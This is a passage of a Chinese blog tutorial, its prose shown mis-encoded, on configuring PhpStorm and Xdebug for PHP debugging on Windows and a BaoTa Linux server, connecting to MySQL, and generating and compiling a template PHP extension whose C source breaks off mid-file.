          <a href="#3-æœåŠ¡å™¨ç«¯é…ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æœåŠ¡å™¨ç«¯é…ç½®" class="headerlink" title="(3)æœåŠ¡å™¨ç«¯é…ç½®"></a>(3)æœåŠ¡å™¨ç«¯é…ç½®</h3>
      <p>setting-&gt;server</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071101687.png" alt="image-20220107110138638"></p>
<p>æ²¡æœ‰çš„è‡ªè¡Œ+å·æ·»åŠ ï¼Œåå­—è‡ªå·±å®šä¹‰</p>

        <h3 id="4-é…ç½®phpæ–‡ä»¶è·¯å¾„"   >
          <a href="#4-é…ç½®phpæ–‡ä»¶è·¯å¾„" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-é…ç½®phpæ–‡ä»¶è·¯å¾„" class="headerlink" title="(4)é…ç½®phpæ–‡ä»¶è·¯å¾„"></a>(4)é…ç½®phpæ–‡ä»¶è·¯å¾„</h3>
      <p>Run-&gt;Edit Configurations</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071108373.png" alt="image-20220107110807337"></p>
<p>ç„¶åæ·»åŠ å¯¹åº”çš„è°ƒè¯•è·¯å¾„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071110934.png" alt="image-20220107111003896"></p>
<p>å¯¹åº”è®¾ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071111653.png" alt="image-20220107111151592"></p>

        <h2 id="4-å¼€å§‹è°ƒè¯•"   >
          <a href="#4-å¼€å§‹è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å¼€å§‹è°ƒè¯•" class="headerlink" title="4.å¼€å§‹è°ƒè¯•"></a>4.å¼€å§‹è°ƒè¯•</h2>
      <p>ç„¶ååœ¨phpStormä¸­å¯¹åº”ç½‘ç«™çš„ç›®å½•ä¸‹çš„æ–‡ä»¶å³å¯ä¸‹æ–­ç‚¹å¼€å§‹è°ƒè¯•</p>

        <h3 id="1-å¼€å§‹ç›‘å¬"   >
          <a href="#1-å¼€å§‹ç›‘å¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¼€å§‹ç›‘å¬" class="headerlink" title="(1)å¼€å§‹ç›‘å¬"></a>(1)å¼€å§‹ç›‘å¬</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071115224.png" alt="image-20220107111554195"></p>
<p>è®¾ç½®å¥½è°ƒè¯•ç¯å¢ƒï¼Œç„¶åç‚¹æ—è¾¹çš„ç”µè¯ï¼Œä½¿å…¶å˜æˆå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071116386.png" alt="image-20220107111631356"></p>

        <h3 id="2-è°ƒè¯•"   >
          <a href="#2-è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è°ƒè¯•" class="headerlink" title="(2)è°ƒè¯•"></a>(2)è°ƒè¯•</h3>
      <p>åœ¨æ–‡ä»¶ä¸­ä¸‹æ–­ç‚¹ï¼Œç‚¹å‡»debugå³å¯å¼€å§‹è°ƒè¯•</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071124166.png" alt="image-20220107112446079"></p>

        <h2 id="ğŸ”ºLinuxç‰ˆæœ¬"   >
          <a href="#ğŸ”ºLinuxç‰ˆæœ¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºLinuxç‰ˆæœ¬" class="headerlink" title="ğŸ”ºLinuxç‰ˆæœ¬"></a>ğŸ”ºLinuxç‰ˆæœ¬</h2>
      
        <h2 id="1-å‰ç½®å®‰è£…-1"   >
          <a href="#1-å‰ç½®å®‰è£…-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®å®‰è£…-1" class="headerlink" title="1.å‰ç½®å®‰è£…"></a>1.å‰ç½®å®‰è£…</h2>
      <p>ç”¨çš„ä¹Ÿæ˜¯PHPSTORMå’Œå®å¡”linux</p>

        <h2 id="2-å®å¡”linuxè®¾ç½®"   >
          <a href="#2-å®å¡”linuxè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å®å¡”linuxè®¾ç½®" class="headerlink" title="2.å®å¡”linuxè®¾ç½®"></a>2.å®å¡”linuxè®¾ç½®</h2>
      
        <h3 id="1-å®‰è£…xdebug"   >
          <a href="#1-å®‰è£…xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å®‰è£…xdebug" class="headerlink" title="(1)å®‰è£…xdebug"></a>(1)å®‰è£…xdebug</h3>
      <p>å®‰è£…å¥½PHPä¹‹åï¼Œè®¾ç½®å®‰è£…PHPçš„æ‹“å±•</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131101953.png" alt="image-20220113110140841"></p>

        <h3 id="2-é…ç½®php-ini"   >
          <a href="#2-é…ç½®php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é…ç½®php-ini" class="headerlink" title="(2)é…ç½®php.ini"></a>(2)é…ç½®php.ini</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131102613.png" alt="image-20220113110241556"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">; å…è®¸è¿œç¨‹ å¯ä»¥ä¸º On æˆ–è€… 1 éƒ½è¡¨ç¤ºå¯ç”¨ ï¼Œ Off å’Œ 0 è¡¨ç¤ºå…³é—­å…³é—­</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">; è¿œç¨‹ä¸»æœºçš„ IP è¿™é‡Œæˆ‘ä»¬å¡«å†™ï¼Œå›ºå®šçš„ 127.0.0.1 è¿™é‡Œå†™çš„æ˜¯PHPSTORMæ‰€åœ¨çš„é‚£å°æœºå™¨ä¸Šçš„IP</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">; è°ƒè¯•è¿æ¥ç«¯å£ è¯·è®°ä½è¿™ä¸ªç«¯å£ï¼Œåç»­ä¼šç”¨åˆ°ã€‚æ­¤é…ç½®é¡¹é»˜è®¤å€¼ä¸º 9000 ï¼Œä½†æ˜¯é€šå¸¸ 9000 ç«¯å£è¢« fpm å æ® ï¼Œæ•…æ›´æ¢ç«¯å£ã€‚</span><br><span class="line">; å¦å¤–ï¼Œè¯·åœ¨ä½ æœåŠ¡å™¨çš„æ§åˆ¶é¢æ¿å’ŒæœåŠ¡å™¨é˜²ç«å¢™ä¸­å¼€æ”¾è¿™ä¸ªç«¯å£çš„è¿›å‡ºç«™ã€‚</span><br><span class="line">; å¦‚æœä½ æ˜¯å®å¡”é¢æ¿ç”¨æˆ· è¯·æ”¾è¡Œæ­¤ç«¯å£ã€‚</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">; æ¥ä¸‹æ¥çš„å€¼éƒ½æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯æˆ‘æ¨èä½ ä½¿ç”¨</span><br><span class="line">; è¿æ¥ IDE çš„ Keyï¼Œè¯·è®°ä½ä»–ï¼Œå¯ä»¥è‡ªå·±è‡ªå®šä¹‰ï¼Œä¸»è¦ç”¨æ¥è¿‡æ»¤è¯·æ±‚ã€‚</span><br><span class="line">xdebug.idekey=PHPSTORM</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable=On</span><br></pre></td></tr></table></div></figure>

<p>å‚ç…§</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.t1h2ua.cn/archives/69" >Linuxå†…ç½‘æœåŠ¡å™¨+å®å¡”+Xdebugè¿œç¨‹è°ƒè¯•é…ç½® â€“ T1h2uaâ€™s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä¿å­˜ä¹‹åï¼Œé‡è½½ä¸€ä¸‹é…ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131104394.png" alt="image-20220113110410355"></p>

        <h3 id="3-ç½‘ç«™è·¯å¾„è®¾ç½®"   >
          <a href="#3-ç½‘ç«™è·¯å¾„è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç½‘ç«™è·¯å¾„è®¾ç½®" class="headerlink" title="(3)ç½‘ç«™è·¯å¾„è®¾ç½®"></a>(3)ç½‘ç«™è·¯å¾„è®¾ç½®</h3>
      <p>å®å¡”Linuxä¸­ç‚¹å‡»ç½‘ç«™ï¼Œæ·»åŠ ç«™ç‚¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131105621.png" alt="image-20220113110540548"></p>
<p>å¾—åˆ°å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131106699.png" alt="image-20220113110610661"></p>

        <h3 id="4-å¼€å¯æœåŠ¡"   >
          <a href="#4-å¼€å¯æœåŠ¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å¼€å¯æœåŠ¡" class="headerlink" title="(4)å¼€å¯æœåŠ¡"></a>(4)å¼€å¯æœåŠ¡</h3>
      <p>è®°å¾—æŠŠå¯¹åº”çš„æœåŠ¡æ‰“å¼€ï¼Œnginx/apacheå’Œphp</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131107520.png" alt="image-20220113110735466"></p>

        <h3 id="5-æ”¾è¡Œ9001ç«¯å£"   >
          <a href="#5-æ”¾è¡Œ9001ç«¯å£" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-æ”¾è¡Œ9001ç«¯å£" class="headerlink" title="(5)æ”¾è¡Œ9001ç«¯å£"></a>(5)æ”¾è¡Œ9001ç«¯å£</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131115950.png" alt="image-20220113111553907"></p>

        <h2 id="3-phpStormè®¾ç½®"   >
          <a href="#3-phpStormè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpStormè®¾ç½®" class="headerlink" title="3.phpStormè®¾ç½®"></a>3.phpStormè®¾ç½®</h2>
      <p>è¿™é‡Œå°±éƒ½å·®ä¸å¤šï¼Œé€‰æ‹©phpç‰ˆæœ¬ï¼Œé…ç½®xdebugï¼Œé…ç½®Serverï¼Œé…ç½®phpæ–‡ä»¶è·¯å¾„ï¼Œæ³¨æ„è¿™é‡Œé€‰å–çš„ç«¯å£ä¸º9001</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109452.png" alt="image-20220113110926412"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110087.png" alt="image-20220113111016050"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109570.png" alt="image-20220113110938531"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110947.png" alt="image-20220113111029912"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131112793.png" alt="image-20220113111210749"></p>
<p>ç„¶åå°±å¯ä»¥è°ƒè¯•äº†ã€‚</p>

        <h2 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h2>
      <p>xdebug3.0ä»¥ä¸Šçš„ï¼Œé…ç½®æœ‰ç‚¹å˜åŒ–ï¼Œå¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">xdebug.mode = develop,debug</span><br><span class="line">xdebug.start_with_request = default|default</span><br><span class="line">;xdebug.start_with_request = yes ;å½“æ”¹ä¸ºyesæ—¶æ‰€æœ‰è¯·æ±‚éƒ½ä¼šèµ°debugï¼Œä¸éœ€è¦è®¾ç½®idekey </span><br><span class="line">xdebug.client_host = 127.0.0.1 </span><br><span class="line">xdebug.client_port = 9001</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.cli_color = 2</span><br><span class="line">xdebug.var_display_max_depth = 15</span><br><span class="line">xdebug.var_display_max_data  = 2048</span><br></pre></td></tr></table></div></figure>




        <h1 id="äºŒã€æ•°æ®åº“æ­å»º"   >
          <a href="#äºŒã€æ•°æ®åº“æ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€æ•°æ®åº“æ­å»º" class="headerlink" title="äºŒã€æ•°æ®åº“æ­å»º"></a>äºŒã€æ•°æ®åº“æ­å»º</h1>
      
        <h2 id="1-phpStudyè®¾ç½®"   >
          <a href="#1-phpStudyè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-phpStudyè®¾ç½®" class="headerlink" title="1.phpStudyè®¾ç½®"></a>1.phpStudyè®¾ç½®</h2>
      
        <h3 id="1-åˆ›å»ºæ•°æ®åº“"   >
          <a href="#1-åˆ›å»ºæ•°æ®åº“" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ›å»ºæ•°æ®åº“" class="headerlink" title="(1)åˆ›å»ºæ•°æ®åº“"></a>(1)åˆ›å»ºæ•°æ®åº“</h3>
      <p>è®¾ç½®æ•°æ®åº“ï¼Œæ²¡æœ‰å°±åˆ›å»ºï¼Œé¼ æ ‡ç¢°åˆ°å¯†ç å¯ä»¥æŸ¥çœ‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091150517.png" alt="image-20220109115051455"></p>

        <h3 id="2-æ‰“å¼€MySQLæ•°æ®åº“"   >
          <a href="#2-æ‰“å¼€MySQLæ•°æ®åº“" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ‰“å¼€MySQLæ•°æ®åº“" class="headerlink" title="(2)æ‰“å¼€MySQLæ•°æ®åº“"></a>(2)æ‰“å¼€MySQLæ•°æ®åº“</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091152262.png" alt="image-20220109115216201"></p>

        <h2 id="2-phpStormè®¾ç½®"   >
          <a href="#2-phpStormè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStormè®¾ç½®" class="headerlink" title="2.phpStormè®¾ç½®"></a>2.phpStormè®¾ç½®</h2>
      
        <h3 id="1-è®¾ç½®"   >
          <a href="#1-è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è®¾ç½®" class="headerlink" title="(1)è®¾ç½®"></a>(1)è®¾ç½®</h3>
      <p>view-&gt;Tool Windows-&gt;databases</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153202.png" alt="image-20220109115314160"></p>
<p>ç„¶ååˆ›å»ºä¸€ä¸ªè¿æ¥</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153527.png" alt="image-20220109115352472"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154448.png" alt="image-20220109115418414"></p>
<p>å¯¹åº”è¾“å…¥hostï¼Œè´¦å·å¯†ç å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154268.png" alt="image-20220109115447217"></p>

        <h3 id="2-æŸ¥çœ‹æ§åˆ¶"   >
          <a href="#2-æŸ¥çœ‹æ§åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æŸ¥çœ‹æ§åˆ¶" class="headerlink" title="(2)æŸ¥çœ‹æ§åˆ¶"></a>(2)æŸ¥çœ‹æ§åˆ¶</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091155976.png" alt="image-20220109115523944"></p>
<p>view-&gt;tool windows-&gt;databaseä¹‹åï¼ŒåŒå‡»ä¸Šé¢çº¢æ¡†å¯ä»¥è¿›å…¥æ§åˆ¶ç•Œé¢</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091156880.png" alt="image-20220109115615823"></p>
<p>ç„¶åå°±æ­£å¸¸äº†ã€‚</p>

        <h1 id="ä¸‰ã€PHPæ¨¡å—æ­å»º"   >
          <a href="#ä¸‰ã€PHPæ¨¡å—æ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€PHPæ¨¡å—æ­å»º" class="headerlink" title="ä¸‰ã€PHPæ¨¡å—æ­å»º"></a>ä¸‰ã€PHPæ¨¡å—æ­å»º</h1>
      
        <h2 id="1-åˆ›å»ºæ¨¡å—æ¨¡æ¿"   >
          <a href="#1-åˆ›å»ºæ¨¡å—æ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ›å»ºæ¨¡å—æ¨¡æ¿" class="headerlink" title="1.åˆ›å»ºæ¨¡å—æ¨¡æ¿"></a>1.åˆ›å»ºæ¨¡å—æ¨¡æ¿</h2>
      <p>æ‰¾åˆ°phpæºç ç›®å½•</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101746346.png" alt="image-20220210174644261"></p>
<p>ç„¶åä½¿ç”¨<code>ext_skel</code>åˆ›å»ºä¸€ä¸ªæ¨¡æ¿</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=helloworld</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-ç¼–è¯‘æ¨¡å—"   >
          <a href="#2-ç¼–è¯‘æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç¼–è¯‘æ¨¡å—" class="headerlink" title="2.ç¼–è¯‘æ¨¡å—"></a>2.ç¼–è¯‘æ¨¡å—</h2>
      <p>éšåè¿›è¡Œç¼–è¯‘ï¼Œè·³è½¬åˆ°åˆšåˆšç”Ÿæˆçš„æ¨¡å—æ–‡ä»¶å¤¹è·¯å¾„<code>/path_to_php_src/ext/helloworld</code>ï¼Œç„¶åç¼–è¯‘</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/56/bin/phpize</span><br><span class="line">./configure  --with-php-config=/www/server/php/56/bin/php-config</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œéœ€è¦æŒ‡å®šä¸€ä¸‹<code>--with-php-config</code>ï¼Œé€‰æ‹©è‡ªå·±çš„<code>php-config</code>ï¼Œå½“ç„¶å¦‚æœæœ¬åœ°çš„ç¯å¢ƒå˜é‡binå‘½ä»¤ä¸‹ç›´æ¥æœ‰<code>php-config</code>ä¹Ÿä¸ç”¨æŒ‡å®šäº†ï¼Œéšå</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±å¯ä»¥åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101759576.png" alt="image-20220210175900511"></p>
<p>å…¶ä¸­<code>helloworld.c</code>å³ä¸ºåˆ›å»ºçš„æ¨¡æ¿ä»£ç ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ5.6ç‰ˆæœ¬çš„ç¼–è¯‘å®Œæˆåï¼Œä¸ç”Ÿæˆ.soæ¨¡å—æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬ç‰¹æ€§ï¼Ÿ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* helloword extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_helloword.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; void helloword_test1()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; string helloword_test2( [ string $var ] )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">		<span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span></span><br><span class="line"><span class="function">	<span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Hello %s&quot;</span>, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLOWORD)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;helloword support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span 